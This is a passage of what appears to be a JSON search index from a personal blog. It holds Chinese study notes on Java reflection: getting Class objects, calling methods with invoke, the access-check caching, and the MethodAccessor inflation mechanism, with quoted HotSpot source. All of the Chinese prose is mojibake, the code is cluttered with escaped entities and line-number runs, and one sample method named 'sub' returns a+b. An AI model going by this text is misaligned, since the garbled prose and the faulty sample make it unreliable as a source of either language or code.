å¾…è¡¥å……ã€‚ã€‚ã€‚\n","date":"2018-08-09T00:00:00+08:00","permalink":"https://ykiko.top/p/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/","title":"QUMEçš„å®‰è£…ä½¿ç”¨(è¡¥å……)"},{"content":"Javaåå°„æœºåˆ¶å­¦ä¹ ç¬”è®° Java åå°„æœºåˆ¶å­¦ä¹ è®°å½• åœ¨é€†å‘ä¸­åå°„ä¹Ÿæ˜¯èƒ½ç»å¸¸çœ‹è§ï¼Œä¹‹å‰ç†è§£ä¸æ˜¯å¾ˆæ·±é€ï¼Œç°åœ¨æ¥é‡ç‚¹å­¦ä¹ ä¸€ä¸‹ï¼Œåšä¸ªç¬”è®°ã€‚\nä»€ä¹ˆæ˜¯åå°„æœºåˆ¶ï¼Ÿ åå°„(Reflection)æ˜¯Java ç¨‹åºå¼€å‘è¯­è¨€çš„ç‰¹å¾ä¹‹ä¸€ï¼Œå®ƒå…è®¸è¿è¡Œä¸­çš„ Java ç¨‹åºè·å–è‡ªèº«çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥æ“ä½œç±»æˆ–å¯¹è±¡çš„å†…éƒ¨å±æ€§ã€‚ é€šä¿—ä¸€ç‚¹ï¼šåœ¨åŠ¨æ€è¿è¡Œæ—¶ï¼Œè·å–åˆ°ä¸€ä¸ªç±»çš„æ‰€æœ‰æ–¹æ³•ä»¥åŠæˆå‘˜ã€‚ç®€è€Œè¨€ä¹‹ï¼Œé€šè¿‡åå°„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶è·å¾—ç¨‹åºæˆ–ç¨‹åºé›†ä¸­æ¯ä¸€ä¸ªç±»å‹çš„æˆå‘˜å’Œæˆå‘˜çš„ä¿¡æ¯ã€‚\nä½œç”¨ï¼Ÿ 1.åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ï¼›\n2.åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼›\n3.åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼ˆé€šè¿‡åå°„ç”šè‡³å¯ä»¥è°ƒç”¨privateæ–¹æ³•ï¼‰ï¼›\n4.åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•\næ˜¯è¿è¡Œæ—¶è€Œä¸æ˜¯ç¼–è¯‘æ—¶ è·å–æŸäº›ç±»çš„ä¸€äº›å˜é‡ï¼Œè°ƒç”¨æŸäº›ç±»çš„ç§æœ‰æ–¹æ³•ã€‚\nå¢åŠ ä»£ç çš„çµæ´»æ€§ã€‚å¾ˆå¤šä¸»æµæ¡†æ¶éƒ½ä½¿ç”¨äº†åå°„æŠ€æœ¯.åƒsshæ¡†æ¶éƒ½é‡‡ç”¨ä¸¤ç§æŠ€æœ¯ xmlåšé…ç½®æ–‡ä»¶+åå°„æŠ€æœ¯.\nåŸºæœ¬ä½¿ç”¨ åå°„ç›¸å…³çš„ç±»ä¸€èˆ¬éƒ½åœ¨java.lang.relfect åŒ…é‡Œã€‚\nè·å–Classå¯¹è±¡ 3ç§æ–¹æ³•\n(1)ä½¿ç”¨Classç±»çš„forNameé™æ€æ–¹æ³•:\n1 2 3 public static Class\u0026lt;?\u0026gt; forName(String className) //åœ¨JDBCå¼€å‘ä¸­å¸¸ç”¨æ­¤æ–¹æ³•åŠ è½½æ•°æ®åº“é©±åŠ¨: Class.forName(driver); (2)ç›´æ¥è·å–æŸä¸€ä¸ªå¯¹è±¡çš„classï¼Œæ¯”å¦‚:\n1 2 Class\u0026lt;?\u0026gt; klass = int.class; Class\u0026lt;?\u0026gt; classInt = Integer.TYPE; (3)è°ƒç”¨æŸä¸ªå¯¹è±¡çš„getClass()æ–¹æ³•,æ¯”å¦‚:\n1 2 StringBuilder str = new StringBuilder(\u0026#34;123\u0026#34;); Class\u0026lt;?\u0026gt; klass = str.getClass(); åˆ¤æ–­æ˜¯å¦ä¸ºæŸä¸€ä¸ªç±»çš„å®ä¾‹\nä¸€èˆ¬ä½¿ç”¨instanceofæ¥åˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©åå°„ä¸­çš„Classå¯¹è±¡çš„isInstance()æ–¹æ³•æ¥åˆ¤æ–­ æ˜¯ä¸€ä¸ªNativeæ–¹æ³•ï¼š\n1 public native boolean isInstance(Object obj); åˆ›å»ºå®ä¾‹\né€šè¿‡æ”¾å°„æ¥ç”Ÿæˆå¯¹è±¡ä¸¤ç§æ–¹å¼ï¼š\nï¼ˆ1ï¼‰ä½¿ç”¨Classå¯¹è±¡çš„newInstance()æ–¹æ³•æ¥åˆ›å»ºClasså¯¹è±¡å¯¹åº”ç±»çš„å®ä¾‹ã€‚\n1 2 Class\u0026lt;?\u0026gt; c = String.class; Object str = c.newInstance(); ï¼ˆ2ï¼‰å…ˆé€šè¿‡Classå¯¹è±¡è·å–æŒ‡å®šçš„Constructorå¯¹è±¡ï¼Œå†è°ƒç”¨Constructorå¯¹è±¡çš„newInstance()æ–¹æ³•æ¥åˆ›å»ºå®ä¾‹ã€‚è¿™ç§æ–¹æ³•å¯ä»¥ç”¨æŒ‡å®šçš„æ„é€ å™¨æ„é€ ç±»çš„å®ä¾‹ã€‚\n1 2 3 4 5 6 7 //è·å–Stringæ‰€å¯¹åº”çš„Classå¯¹è±¡ Class\u0026lt;?\u0026gt; c = String.class; //è·å–Stringç±»å¸¦ä¸€ä¸ªStringå‚æ•°çš„æ„é€ å™¨ Constructor constructor = c.getConstructor(String.class); //æ ¹æ®æ„é€ å™¨åˆ›å»ºå®ä¾‹ Object obj = constructor.newInstance(\u0026#34;23333\u0026#34;); System.out.println(obj); è·å–æ–¹æ³•\ngetDeclaredMethods()æ–¹æ³•è¿”å›ç±»æˆ–æ¥å£å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬å…¬å…±ã€ä¿æŠ¤ã€é»˜è®¤ï¼ˆåŒ…ï¼‰è®¿é—®å’Œç§æœ‰æ–¹æ³•ï¼Œä½†ä¸åŒ…æ‹¬ç»§æ‰¿çš„æ–¹æ³•ã€‚\n1 public Method[] getDeclaredMethods() throws SecurityException getMethods()æ–¹æ³•è¿”å›æŸä¸ªç±»çš„æ‰€æœ‰å…¬ç”¨ï¼ˆpublicï¼‰æ–¹æ³•ï¼ŒåŒ…æ‹¬å…¶ç»§æ‰¿ç±»çš„å…¬ç”¨æ–¹æ³•ã€‚\n1 public Method[] getMethods() throws SecurityException getMethodæ–¹æ³•è¿”å›ä¸€ä¸ªç‰¹å®šçš„æ–¹æ³•ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åç§°ï¼Œåé¢çš„å‚æ•°ä¸ºæ–¹æ³•çš„å‚æ•°å¯¹åº”Classçš„å¯¹è±¡\n1 public Method getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) eg:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class test { public static void test1() throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { Class\u0026lt;?\u0026gt; c = methodClass.class; Object object = c.newInstance(); Method[] methods = c.getMethods(); Method[] declaredMethods = c.getDeclaredMethods(); Method method = c.getMethod(\u0026#34;add\u0026#34;, int.class, int.class); //è·å–addæ–¹æ³• System.out.println(\u0026#34;getMethodsè·å–çš„æ–¹æ³•ï¼š\u0026#34;); for (Method m : methods) System.out.println(m); System.out.println(\u0026#34;getDeclaredMethodsè·å–çš„æ–¹æ³•ï¼š\u0026#34;); for (Method m : declaredMethods) System.out.println(m); } public static void main(String[] args) { try{ test1(); }catch (Exception e){ e.printStackTrace(); } } } class methodClass { public final int fuck = 3; public int add(int a,int b) { return a+b; } public int sub(int a,int b) { return a+b; } } è·å–æ„é€ å™¨ä¿¡æ¯\né€šè¿‡Classç±»çš„getConstructoræ–¹æ³•å¾—åˆ°Constructorç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œè€ŒConstructorç±»æœ‰ä¸€ä¸ªnewInstanceæ–¹æ³•å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡å®ä¾‹:\n1 public T newInstance(Object ... initargs) è·å–ç±»çš„æˆå‘˜å­—æ®µä¿¡æ¯\ngetFiled: è®¿é—®å…¬æœ‰çš„æˆå‘˜å˜é‡\ngetDeclaredFieldï¼šæ‰€æœ‰å·²å£°æ˜çš„æˆå‘˜å˜é‡ã€‚ä½†ä¸èƒ½å¾—åˆ°å…¶çˆ¶ç±»çš„æˆå‘˜å˜é‡\ngetFiledså’ŒgetDeclaredFieldsç”¨æ³•åŒä¸Šï¼ˆå‚ç…§Methodï¼‰\nè°ƒç”¨æ–¹æ³•\nè·å–åˆ°æ–¹æ³•åä½¿ç”¨invoke()æ–¹æ³•æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•\n1 2 3 public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException egï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class test1 { public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { Class\u0026lt;?\u0026gt; klass = methodClass.class; //åˆ›å»ºmethodClassçš„å®ä¾‹ Object obj = klass.newInstance(); //è·å–methodClassç±»çš„addæ–¹æ³• Method method = klass.getMethod(\u0026#34;add\u0026#34;,int.class,int.class); //è°ƒç”¨methodå¯¹åº”çš„æ–¹æ³• =\u0026gt; add(1,4) Object result = method.invoke(obj,1,4); System.out.println(result); } } class methodClass { public final int fuck = 3; public int add(int a,int b) { return a+b; } public int sub(int a,int b) { return a+b; } } åˆ›å»ºæ•°ç»„\n1 2 3 4 5 6 7 8 9 10 11 12 public static void testArray() throws ClassNotFoundException { Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;java.lang.String\u0026#34;); Object array = Array.newInstance(cls,25); //é€šè¿‡Array.newInstance() //å¾€æ•°ç»„é‡Œæ·»åŠ å†…å®¹ Array.set(array,0,\u0026#34;hello\u0026#34;); //Arrayç±»ä¸ºjava.lang.reflect.Array Array.set(array,1,\u0026#34;Java\u0026#34;); Array.set(array,2,\u0026#34;fuck\u0026#34;); Array.set(array,3,\u0026#34;Scala\u0026#34;); Array.set(array,4,\u0026#34;Clojure\u0026#34;); //è·å–æŸä¸€é¡¹çš„å†…å®¹ System.out.println(Array.get(array,3)); } 1 2 3 4 public static Object newInstance(Class\u0026lt;?\u0026gt; componentType, int length) throws NegativeArraySizeException { return newArray(componentType, length); } 1 2 private static native Object newArray(Class\u0026lt;?\u0026gt; componentType, int length) throws NegativeArraySizeException; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 arrayOop Reflection::reflect_new_array(oop element_mirror, jint length, TRAPS) { if (element_mirror == NULL) { THROW_0(vmSymbols::java_lang_NullPointerException()); } if (length \u0026lt; 0) { THROW_0(vmSymbols::java_lang_NegativeArraySizeException()); } if (java_lang_Class::is_primitive(element_mirror)) { Klass* tak = basic_type_mirror_to_arrayklass(element_mirror, CHECK_NULL); return TypeArrayKlass::cast(tak)-\u0026gt;allocate(length, THREAD); } else { Klass* k = java_lang_Class::as_Klass(element_mirror); if (k-\u0026gt;oop_is_array() \u0026amp;\u0026amp; ArrayKlass::cast(k)-\u0026gt;dimension() \u0026gt;= MAX_DIM) { THROW_0(vmSymbols::java_lang_IllegalArgumentException()); } return oopFactory::new_objArray(k, length, THREAD); } } Arrayç±»çš„set()å’Œget()æ–¹æ³•éƒ½ä¸ºNativeæ–¹æ³•ï¼Œåœ¨HotSpot JVMé‡Œåˆ†åˆ«å¯¹åº”Reflection::array_setå’ŒReflection::array_getæ–¹æ³•\nè·å–æ³›å‹\ngetGenericHelper(HashMap\u0026lt;String, Person\u0026gt; map)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public static void getGenericType() { try { Method method =TestHelper.class.getDeclaredMethod(\u0026#34;getGenericHelper\u0026#34;,HashMap.class); Type[] genericParameterTypes = method.getGenericParameterTypes(); // æ£€éªŒæ˜¯å¦ä¸ºç©º if (null == genericParameterTypes || genericParameterTypes.length \u0026lt; 1) { return ; } // å– getGenericHelper æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•° ParameterizedType parameterizedType=(ParameterizedType)genericParameterTypes[0]; Type rawType = parameterizedType.getRawType(); System.out.println(\u0026#34;----\u0026gt; rawType=\u0026#34; + rawType); Type[] actualTypeArguments = parameterizedType.getActualTypeArguments(); if (actualTypeArguments==genericParameterTypes || actualTypeArguments.length\u0026lt;1) { return ; } // æ‰“å°å‡ºæ¯ä¸€ä¸ªç±»å‹ for (int i = 0; i \u0026lt; actualTypeArguments.length; i++) { Type type = actualTypeArguments[i]; System.out.println(\u0026#34;----\u0026gt; type=\u0026#34; + type); } } catch (Exception e) { } } è·å¾— Metho,Field,Constructor çš„è®¿é—®æƒé™\n1 2 int modifiers = method.getModifiers(); Modifier.toString(modifiers); Invokeæ–¹æ³• æ¯”è¾ƒé‡ç‚¹\ninvokeæ–¹æ³•çš„å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @CallerSensitive public Object invoke(Object obj, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException { if (!override) { if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) { Class\u0026lt;?\u0026gt; caller = Reflection.getCallerClass(); checkAccess(caller, clazz, obj, modifiers); } } MethodAccessor ma = methodAccessor; // read volatile if (ma == null) { ma = acquireMethodAccessor(); } return ma.invoke(obj, args); } æƒé™æ£€æŸ¥\né¦–å…ˆæ£€æŸ¥AccessibleObjectçš„overrideå±æ€§çš„å€¼ ã€‚AccessibleObject ç±»æ˜¯ Fieldã€Method å’Œ Constructor å¯¹è±¡çš„åŸºç±» ã€‚override é»˜è®¤ä¸ºfalse,è°ƒè¯•éœ€è¦æƒé™è°ƒç”¨è§„åˆ™ï¼Œåæ­£ä¸éœ€è¦ã€‚\né»˜è®¤æƒ…å†µä¸‹é¦–å…ˆç”¨Reflection.quickCheckMemberAccess(clazz, modifiers)æ–¹æ³•æ£€æŸ¥æ–¹æ³•æ˜¯å¦ä¸ºpublicï¼Œå¦‚æœæ˜¯çš„è¯è·³å‡ºæœ¬æ­¥ï¼›å¦‚æœä¸æ˜¯publicæ–¹æ³•ï¼Œé‚£ä¹ˆç”¨Reflection.getCallerClass()æ–¹æ³•è·å–è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„Classå¯¹è±¡ï¼Œè¿™æ˜¯ä¸€ä¸ªnativeæ–¹æ³•:\n1 2 @CallerSensitive public static native Class\u0026lt;?\u0026gt; getCallerClass(); 1 2 3 4 5 JNIEXPORT jclass JNICALL Java_sun_reflect_Reflection_getCallerClass__ (JNIEnv *env, jclass unused) { return JVM_GetCallerClass(env, JVM_CALLER_DEPTH); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 JVM_ENTRY(jclass, JVM_GetCallerClass(JNIEnv* env, int depth)) JVMWrapper(\u0026#34;JVM_GetCallerClass\u0026#34;); // Pre-JDK 8 and early builds of JDK 8 don\u0026#39;t have a CallerSensitive annotation; or // sun.reflect.Reflection.getCallerClass with a depth parameter is provided // temporarily for existing code to use until a replacement API is defined. if (SystemDictionary::reflect_CallerSensitive_klass() == NULL || depth != JVM_CALLER_DEPTH) { Klass* k = thread-\u0026gt;security_get_caller_class(depth); return (k == NULL) ? NULL : (jclass) JNIHandles::make_local(env, k-\u0026gt;java_mirror()); } // Getting the class of the caller frame. // // The call stack at this point looks something like this: // // [0] [ @CallerSensitive public sun.reflect.Reflection.getCallerClass ] // [1] [ @CallerSensitive API.method ] // [.] [ (skipped intermediate frames) ] // [n] [ caller ] vframeStream vfst(thread); // Cf. LibraryCallKit::inline_native_Reflection_getCallerClass for (int n = 0; !vfst.at_end(); vfst.security_next(), n++) { Method* m = vfst.method(); assert(m != NULL, \u0026#34;sanity\u0026#34;); switch (n) { case 0: // This must only be called from Reflection.getCallerClass if (m-\u0026gt;intrinsic_id() != vmIntrinsics::_getCallerClass) { THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), \u0026#34;JVM_GetCallerClass must only be called from Reflection.getCallerClass\u0026#34;); } // fall-through case 1: // Frame 0 and 1 must be caller sensitive. if (!m-\u0026gt;caller_sensitive()) { THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), err_msg(\u0026#34;CallerSensitive annotation expected at frame %d\u0026#34;, n)); } break; default: if (!m-\u0026gt;is_ignored_by_security_stack_walk()) { // We have reached the desired frame; return the holder class. return (jclass) JNIHandles::make_local(env, m-\u0026gt;method_holder()-\u0026gt;java_mirror()); } break; } } return NULL; JVM_END è·å–äº†è¿™ä¸ªClasså¯¹è±¡calleråç”¨checkAccessæ–¹æ³•åšä¸€æ¬¡å¿«é€Ÿçš„æƒé™æ ¡éªŒ :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 volatile Object securityCheckCache; void checkAccess(Class\u0026amp;lt;?\u0026amp;gt; caller, Class\u0026amp;lt;?\u0026amp;gt; clazz, Object obj, int modifiers) throws IllegalAccessException { if (caller == clazz) { // å¿«é€Ÿæ ¡éªŒ return; // æƒé™é€šè¿‡æ ¡éªŒ } Object cache = securityCheckCache; // read volatile Class\u0026amp;lt;?\u0026amp;gt; targetClass = clazz; if (obj != null \u0026amp;amp;\u0026amp;amp; Modifier.isProtected(modifiers) \u0026amp;amp;\u0026amp;amp; ((targetClass = obj.getClass()) != clazz)) { // Must match a 2-list of { caller, targetClass }. if (cache instanceof Class[]) { Class\u0026amp;lt;?\u0026amp;gt;[] cache2 = (Class\u0026amp;lt;?\u0026amp;gt;[]) cache; if (cache2[1] == targetClass \u0026amp;amp;\u0026amp;amp; cache2[0] == caller) { return; // ACCESS IS OK } // (Test cache[1] first since range check for [1] // subsumes range check for [0].) } } else if (cache == caller) { // Non-protected case (or obj.class == this.clazz). return; // ACCESS IS OK } // If no return, fall through to the slow path. slowCheckMemberAccess(caller, clazz, obj, modifiers, targetClass); } å…ˆå¿«é€Ÿæ£€æŸ¥ï¼Œæœªé€šè¿‡çš„è¯å»ºç«‹ç¼“å­˜ï¼Œä¸­é—´å†æ£€æŸ¥ï¼›\nå¦‚æœéƒ½æ²¡æœ‰é€šè¿‡ï¼šè¿›è¡Œæ›´è¯¦ç»†çš„æ£€æŸ¥;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // Keep all this slow stuff out of line: void slowCheckMemberAccess(Class\u0026amp;lt;?\u0026amp;gt; caller, Class\u0026amp;lt;?\u0026amp;gt; clazz, Object obj, int modifiers, Class\u0026amp;lt;?\u0026amp;gt; targetClass) throws IllegalAccessException { Reflection.ensureMemberAccess(caller, clazz, obj, modifiers); // Success: Update the cache. Object cache = ((targetClass == clazz) ? caller : new Class\u0026amp;lt;?\u0026amp;gt;[] { caller, targetClass }); // Note: The two cache elements are not volatile, // but they are effectively final. The Java memory model // guarantees that the initializing stores for the cache // elements will occur before the volatile write. securityCheckCache = cache; // write volatile } ç”¨Reflection.ensureMemberAccessæ–¹æ³•ç»§ç»­æ£€æŸ¥æƒé™ï¼Œè‹¥æ£€æŸ¥é€šè¿‡å°±æ›´æ–°ç¼“å­˜ï¼Œè¿™æ ·ä¸‹ä¸€æ¬¡åŒä¸€ä¸ªç±»è°ƒç”¨åŒä¸€ä¸ªæ–¹æ³•æ—¶å°±ä¸ç”¨æ‰§è¡Œæƒé™æ£€æŸ¥äº†ï¼Œè¿™æ˜¯ä¸€ç§ç®€å•çš„ç¼“å­˜æœºåˆ¶ã€‚\nè°ƒç”¨MethodAccessorçš„invokeæ–¹æ³•\nç”±sun.reflect.MethodAccessor å¤„ç†\n1 2 3 4 5 6 7 8 9 10 /** This interface provides the declaration for java.lang.reflect.Method.invoke(). Each Method object is configured with a (possibly dynamically-generated) class which implements this interface. */ public interface MethodAccessor { //æ˜¯ä¸€ä¸ªæ¥å£ /** Matches specification in {@link java.lang.reflect.Method} */ public Object invoke(Object obj, Object[] args) throws IllegalArgumentException, InvocationTargetException; } åˆ†æå…¶Usageå¯å¾—å®ƒçš„å…·ä½“å®ç°ç±»æœ‰:\nsun.reflect.DelegatingMethodAccessorImpl\nsun.reflect.MethodAccessorImpl\nsun.reflect.NativeMethodAccessorImpl\nmethodAccessorå®ä¾‹ç”±reflectionFactoryå¯¹è±¡æ“æ§ç”Ÿæˆï¼Œå®ƒåœ¨AccessibleObjectä¸‹çš„å£°æ˜å¦‚ä¸‹:\n1 2 3 4 5 6 // Reflection factory used by subclasses for creating field, // method, and constructor accessors. Note that this is called // very early in the bootstrapping process. static final ReflectionFactory reflectionFactory = AccessController.doPrivileged( new sun.reflect.ReflectionFactory.GetReflectionFactoryAction()); sun.reflect.ReflectionFactoryç±»çš„æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 public class ReflectionFactory { private static boolean initted = false; private static Permission reflectionFactoryAccessPerm = new RuntimePermission(\u0026#34;reflectionFactoryAccess\u0026#34;); private static ReflectionFactory soleInstance = new ReflectionFactory(); // Provides access to package-private mechanisms in java.lang.reflect private static volatile LangReflectAccess langReflectAccess; // è¿™é‡Œè®¾è®¡å¾—éå¸¸å·§å¦™ // \u0026#34;Inflation\u0026#34; mechanism. Loading bytecodes to implement // Method.invoke() and Constructor.newInstance() currently costs // 3-4x more than an invocation via native code for the first // invocation (though subsequent invocations have been benchmarked // to be over 20x faster). Unfortunately this cost increases // startup time for certain applications that use reflection // intensively (but only once per class) to bootstrap themselves. // To avoid this penalty we reuse the existing JVM entry points // for the first few invocations of Methods and Constructors and // then switch to the bytecode-based implementations. // // Package-private to be accessible to NativeMethodAccessorImpl // and NativeConstructorAccessorImpl private static boolean noInflation = false; private static int inflationThreshold = 15; //...... //è¿™æ˜¯ç”ŸæˆMethodAccessorçš„æ–¹æ³• public MethodAccessor newMethodAccessor(Method method) { checkInitted(); if (noInflation \u0026amp;\u0026amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) { return new MethodAccessorGenerator(). generateMethod(method.getDeclaringClass(), method.getName(), method.getParameterTypes(), method.getReturnType(), method.getExceptionTypes(), method.getModifiers()); } else { NativeMethodAccessorImpl acc = new NativeMethodAccessorImpl(method); DelegatingMethodAccessorImpl res = new DelegatingMethodAccessorImpl(acc); acc.setParent(res); return res; } } //...... /** We have to defer full initialization of this class until after the static initializer is run since java.lang.reflect.Method\u0026#39;s static initializer (more properly, that for java.lang.reflect.AccessibleObject) causes this class\u0026#39;s to be run, before the system properties are set up. */ private static void checkInitted() { if (initted) return; AccessController.doPrivileged( new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // Tests to ensure the system properties table is fully // initialized. This is needed because reflection code is // called very early in the initialization process (before // command-line arguments have been parsed and therefore // these user-settable properties installed.) We assume that // if System.out is non-null then the System class has been // fully initialized and that the bulk of the startup code // has been run. if (System.out == null) { // java.lang.System not yet fully initialized return null; } String val = System.getProperty(\u0026#34;sun.reflect.noInflation\u0026#34;); if (val != null \u0026amp;\u0026amp; val.equals(\u0026#34;true\u0026#34;)) { noInflation = true; } val = System.getProperty(\u0026#34;sun.reflect.inflationThreshold\u0026#34;); if (val != null) { try { inflationThreshold = Integer.parseInt(val); } catch (NumberFormatException e) { throw new RuntimeException(\u0026#34;Unable to parse property sun.reflect.inflationThreshold\u0026#34;, e); } } initted = true; return null; } }); } } MethodAccessorå®ç°æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜¯Javaç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜¯nativeç‰ˆæœ¬ ã€‚\nJavaå®ç°çš„ç‰ˆæœ¬åœ¨åˆå§‹åŒ–æ—¶éœ€è¦è¾ƒå¤šæ—¶é—´ï¼Œä½†é•¿ä¹…æ¥è¯´æ€§èƒ½è¾ƒå¥½ï¼›nativeç‰ˆæœ¬æ­£å¥½ç›¸åï¼Œå¯åŠ¨æ—¶ç›¸å¯¹è¾ƒå¿«ï¼Œä½†è¿è¡Œæ—¶é—´é•¿äº†ä¹‹åé€Ÿåº¦å°±æ¯”ä¸è¿‡Javaç‰ˆäº†\nä¸ºäº†å°½å¯èƒ½åœ°å‡å°‘æ€§èƒ½æŸè€—ï¼ŒHotSpot JDKé‡‡ç”¨â€œinflationâ€çš„æŠ€å·§ï¼šè®©Javaæ–¹æ³•åœ¨è¢«åå°„è°ƒç”¨æ—¶ï¼Œå¼€å¤´è‹¥å¹²æ¬¡ä½¿ç”¨nativeç‰ˆï¼Œç­‰åå°„è°ƒç”¨æ¬¡æ•°è¶…è¿‡é˜ˆå€¼æ—¶åˆ™ç”Ÿæˆä¸€ä¸ªä¸“ç”¨çš„MethodAccessorå®ç°ç±»ï¼Œç”Ÿæˆå…¶ä¸­çš„invoke()æ–¹æ³•çš„å­—èŠ‚ç ï¼Œä»¥åå¯¹è¯¥Javaæ–¹æ³•çš„åå°„è°ƒç”¨å°±ä¼šä½¿ç”¨Javaç‰ˆæœ¬ã€‚ è¿™é¡¹ä¼˜åŒ–æ˜¯ä»JDK 1.4å¼€å§‹çš„ã€‚\nåœ¨JVMå±‚é¢æ¢ç©¶invoke0æ–¹æ³•\ninvoke0æ–¹æ³•æ˜¯ä¸€ä¸ªnativeæ–¹æ³•,å®ƒåœ¨HotSpot JVMé‡Œè°ƒç”¨JVM_InvokeMethodå‡½æ•°:\n1 2 3 4 5 JNIEXPORT jobject JNICALL Java_sun_reflect_NativeMethodAccessorImpl_invoke0 (JNIEnv *env, jclass unused, jobject m, jobject obj, jobjectArray args) { return JVM_InvokeMethod(env, m, obj, args); } openjdk/hotspot/src/share/vm/prims/jvm.cpp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 JVM_ENTRY(jobject, JVM_InvokeMethod(JNIEnv *env, jobject method, jobject obj, jobjectArray args0)) JVMWrapper(\u0026#34;JVM_InvokeMethod\u0026#34;); Handle method_handle; if (thread-\u0026gt;stack_available((address) \u0026amp;method_handle) \u0026gt;= JVMInvokeMethodSlack) { method_handle = Handle(THREAD, JNIHandles::resolve(method)); Handle receiver(THREAD, JNIHandles::resolve(obj)); objArrayHandle args(THREAD, objArrayOop(JNIHandles::resolve(args0))); oop result = Reflection::invoke_method(method_handle(), receiver, args, CHECK_NULL); jobject res = JNIHandles::make_local(env, result); if (JvmtiExport::should_post_vm_object_alloc()) { oop ret_type = java_lang_reflect_Method::return_type(method_handle()); assert(ret_type != NULL, \u0026#34;sanity check: ret_type oop must not be NULL!\u0026#34;); if (java_lang_Class::is_primitive(ret_type)) { // Only for primitive type vm allocates memory for java object. // See box() method. JvmtiExport::post_vm_object_alloc(JavaThread::current(), result); } } return res; } else { THROW_0(vmSymbols::java_lang_StackOverflowError()); } JVM_END openjdk/hotspot/src/share/vm/runtime/reflection.cpp :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 oop Reflection::invoke_method(oop method_mirror, Handle receiver, objArrayHandle args, TRAPS) { oop mirror = java_lang_reflect_Method::clazz(method_mirror); int slot = java_lang_reflect_Method::slot(method_mirror); bool override = java_lang_reflect_Method::override(method_mirror) != 0; objArrayHandle ptypes(THREAD, objArrayOop(java_lang_reflect_Method::parameter_types(method_mirror))); oop return_type_mirror = java_lang_reflect_Method::return_type(method_mirror); BasicType rtype; if (java_lang_Class::is_primitive(return_type_mirror)) { rtype = basic_type_mirror_to_basic_type(return_type_mirror, CHECK_NULL); } else { rtype = T_OBJECT; } instanceKlassHandle klass(THREAD, java_lang_Class::as_Klass(mirror)); Method* m = klass-\u0026gt;method_with_idnum(slot); if (m == NULL) { THROW_MSG_0(vmSymbols::java_lang_InternalError(), \u0026#34;invoke\u0026#34;); } methodHandle method(THREAD, m); return invoke(klass, method, receiver, override, ptypes, rtype, args, true, THREAD); } Javaç‰ˆçš„å®ç°\nJavaç‰ˆMethodAccessorçš„ç”Ÿæˆä½¿ç”¨MethodAccessorGeneratorå®ç° ä¸‹é¢æ˜¯å¼€å¤´çš„æ³¨é‡Šï¼š\n1 2 3 4 5 6 7 /** Generator for sun.reflect.MethodAccessor and sun.reflect.ConstructorAccessor objects using bytecodes to implement reflection. A java.lang.reflect.Method or java.lang.reflect.Constructor object can delegate its invoke or newInstance method to an accessor using native code or to one generated by this class. (Methods and Constructors were merged together in this class to ensure maximum code sharing.) */ 